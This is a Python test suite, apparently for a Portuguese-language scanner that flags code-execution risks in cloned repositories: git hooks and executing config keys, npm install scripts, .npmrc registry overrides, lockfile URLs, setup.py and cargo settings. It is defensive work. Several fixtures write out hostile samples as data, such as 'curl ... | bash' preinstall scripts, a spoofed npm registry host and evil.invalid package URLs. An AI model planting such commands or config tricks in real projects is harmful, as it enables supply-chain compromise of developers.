from pente_fino.achado import Nivel
from tests.apoio import CasoComPasta


class TestGit(CasoComPasta):
    def test_hook_que_veio_na_pasta_e_perigo(self):
        self.escreve(".git/hooks/post-checkout", "#!/bin/sh\necho oi\n")
        achado = self.assertAcusa("git", Nivel.PERIGO, "post-checkout")
        self.assertEqual(achado.trecho, "#!/bin/sh")

    def test_hook_de_exemplo_nao_acusa(self):
        self.escreve(".git/hooks/pre-commit.sample", "#!/bin/sh\n")
        self.assertLimpo("git")

    def test_config_que_executa(self):
        self.escreve(
            ".git/config",
            '[core]\n\tfsmonitor = ./.monitor\n\tsshCommand = ssh -o ProxyCommand=x\n[diff "img"]\n\ttextconv = ./t\n'
            '[merge "m"]\n\tdriver = ./m %O\n[pager]\n\tlog = ./p\n[hook "h"]\n\tcommand = ./h\n'
            "[alias]\n\tst = status\n\tdeploy = !./deploy.sh\n[credential]\n\thelper = store\n",
        )
        perigos = {a.trecho.split(" =")[0] for a in self.achados("git") if a.nivel == Nivel.PERIGO}
        self.assertEqual(
            perigos, {"core.fsmonitor", "core.sshcommand", "diff.textconv", "merge.driver", "pager.log", "hook.command"}
        )
        self.assertAcusa("git", Nivel.ATENCAO, "git deploy")
        self.assertAcusa("git", Nivel.ATENCAO, "credential.helper")

    def test_variantes_da_gramatica_do_git(self):
        self.escreve(
            ".git/config",
            '[core] fsmonitor = ./a\n[filter.x]\n\tsmudge = ./b\n[filter "c\\"d"]\n\tclean = ./c\n'
            "[CORE]\n\tHooksPath = ./h ; comentário\n[credential]\n\thelper = !./senha.sh\n",
        )  # chave na linha do cabeçalho, seção antiga, aspas escapadas, maiúsculas
        perigos = {a.trecho.split(" =")[0] for a in self.achados("git") if a.nivel == Nivel.PERIGO}
        self.assertEqual(
            perigos, {"core.fsmonitor", "filter.smudge", "filter.clean", "core.hookspath", "credential.helper"}
        )

    def test_config_comum_e_lfs_nao_acusam(self):
        self.escreve(
            ".git/config",
            "[core]\n\tfsmonitor = true\n\tbare = false\n"
            '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n',
        )
        self.assertLimpo("git")

    def test_lfs_com_algo_a_mais_acusa(self):
        # sem aspas, o ";" começa um comentário pro git (e o valor fica só o do LFS); com aspas, vale o comando todo
        self.escreve(
            ".git/config",
            '[filter "lfs"]\n\tsmudge = "git-lfs smudge -- %f; ./x"\n\tclean = git-lfs clean -- %f; ./y\n',
        )
        self.assertEqual([a.trecho for a in self.achados("git")], ["filter.smudge = git-lfs smudge -- %f; ./x"])

    def test_submodulo_ponteiro_e_repo_bare(self):
        self.escreve(".git/modules/lib/config", "[core]\n\tfsmonitor = ./a\n")
        self.escreve(".git/modules/lib/hooks/pre-commit", "#!/bin/sh\n")
        self.escreve("sub/.git", "gitdir: ../escondido\n")
        self.escreve("escondido/config", "[core]\n\tpager = ./p\n")
        self.escreve("escondido/HEAD", "ref: refs/heads/main\n")
        self.escreve("fora/.git", "gitdir: /tmp/algum-lugar\n")
        arquivos = {a.arquivo for a in self.achados("git")}
        self.assertEqual(
            arquivos, {".git/modules/lib/config", ".git/modules/lib/hooks/pre-commit", "escondido/config", "fora/.git"}
        )

    def test_pasta_git_em_maiuscula(self):  # no Mac e no Windows, .GIT é o .git
        self.escreve(".GIT/config", "[core]\n\tfsmonitor = ./a\n")
        self.assertAcusa("git", Nivel.PERIGO, "fsmonitor")

    def test_so_olha_config_e_hooks_dentro_do_git(self):
        self.escreve(".git/objects/ab/cdef", b"\x00lixo")
        self.escreve(".git/info/exclude", "*.log\n")
        self.assertLimpo()


class TestNpm(CasoComPasta):
    def test_postinstall_e_atencao(self):
        self.escreve("package.json", {"scripts": {"postinstall": "node setup.js", "test": "jest"}})
        self.assertEqual(self.niveis("pacotes"), [Nivel.ATENCAO])

    def test_postinstall_com_cara_de_golpe_e_perigo(self):
        self.escreve("package.json", {"scripts": {"preinstall": "curl -s https://exemplo.dev/x | bash"}})
        achado = self.assertAcusa("pacotes", Nivel.PERIGO, "preinstall")
        self.assertIn("baixa coisa da internet", achado.porque)

    def test_postinstall_que_chama_outro_script(self):
        self.escreve("package.json", {"scripts": {"postinstall": "npm run setup", "setup": "curl a | sh"}})
        self.assertAcusa("pacotes", Nivel.PERIGO, "postinstall")

    def test_script_comum_com_cara_de_golpe(self):
        self.escreve("package.json", {"scripts": {"start": "curl https://x.invalid/a | sh"}})
        self.assertAcusa("pacotes", Nivel.ATENCAO, "npm run start")

    def test_dependencias_de_fora_do_registro(self):
        deps = {"ok": "^1.0.0", "a": "github:fulano/a", "b": "fulano/b#main", "c": "https://exemplo.dev/c.tgz",
                "d": "file:../d", "e": "npm:outro@2", "f": "workspace:*", "g": "./g.tgz"}  # fmt: skip
        self.escreve("package.json", {"dependencies": deps, "overrides": {"h": "github:x/h"}})
        nomes = {a.titulo.split("«")[1].split("»")[0] for a in self.achados("pacotes")}
        self.assertEqual(nomes, {"a", "b", "c", "g", "h"})

    def test_npmrc(self):
        self.escreve(
            ".npmrc",
            "registry=https://registry.npmjs.org.evil.invalid/\n@e:registry=https://registry.npmjs.org/\n"
            "git=./falso-git\nnode-options=--require ./x.js\n",
        )
        titulos = sorted((a.nivel, a.titulo) for a in self.achados("pacotes"))
        self.assertEqual(
            [t for _, t in titulos],
            [
                "troca o registro de onde o npm baixa os pacotes",
                "faz o Node carregar um arquivo antes de tudo (node-options)",
                "troca o programa que o npm chama (git)",
            ],
        )

    def test_yarn_pnpm_e_npm12(self):
        self.escreve(".yarnrc.yml", "yarnPath: ./tools/yarn.cjs\n")
        self.escreve(".pnpmfile.cjs", "module.exports = {};\n")
        self.escreve(".npm-extension.mjs", "export default {};\n")
        self.escreve("binding.gyp", "{}\n")
        self.assertAcusa("pacotes", Nivel.PERIGO, "yarnPath")
        self.assertEqual(len([a for a in self.achados("pacotes") if a.nivel == Nivel.ATENCAO]), 3)

    def test_lockfile_com_endereco_estranho(self):
        self.escreve(
            "package-lock.json",
            {
                "packages": {
                    "node_modules/a": {"resolved": "https://registry.npmjs.org/a.tgz"},
                    "node_modules/b": {"resolved": "https://evil.invalid/b.tgz"},
                }
            },
        )
        self.assertAcusa("pacotes", Nivel.ATENCAO, "evil.invalid")


class TestPythonERust(CasoComPasta):
    def test_setup_py_sempre_roda_no_pip(self):
        self.escreve("setup.py", "from setuptools import setup\nsetup(name='x')\n")
        self.assertEqual(self.niveis("pacotes"), [Nivel.ATENCAO])

    def test_setup_py_com_internet_e_perigo(self):
        self.escreve("setup.py", "import urllib.request\nurllib.request.urlopen('https://exemplo.dev')\n")
        self.assertAcusa("pacotes", Nivel.PERIGO, "urlopen")

    def test_setup_py_que_so_importa_nao_e_perigo(self):
        self.escreve("setup.py", "import urllib.request\nfrom setuptools import setup\nsetup(name='x')\n")
        self.assertEqual(self.niveis("pacotes"), [Nivel.ATENCAO])

    def test_requirements_com_indice_e_link(self):
        self.escreve(
            "requirements/dev.txt",
            "# comentário com https://pypi.org\nrequests==2.32.0\n--extra-index-url=https://pypi.exemplo.dev\n"
            "lib @ git+https://github.com/fulano/lib\n",
        )
        titulos = sorted(a.titulo for a in self.achados("pacotes"))
        self.assertEqual(
            titulos, ["dependência baixada direto de um link", "manda o pip procurar pacote TAMBÉM fora do PyPI"]
        )

    def test_backend_de_dentro_do_projeto(self):
        self.escreve("pyproject.toml", '[build-system]\nbuild-backend = "b"\nbackend-path = ["."]\n')
        self.assertAcusa("pacotes", Nivel.ATENCAO, "backend-path")

    def test_cargo(self):
        self.escreve("build.rs", "fn main() {}\n")
        self.escreve(
            ".cargo/config.toml",
            "target.x86_64-unknown-linux-gnu.runner = \"sh -c ./r.sh\"\n[build]\nrustc-wrapper = './w'\n",
        )
        self.assertAcusa("pacotes", Nivel.ATENCAO, "build.rs")
        self.assertAcusa("pacotes", Nivel.PERIGO, "runner")
        self.assertAcusa("pacotes", Nivel.ATENCAO, "rustc-wrapper")
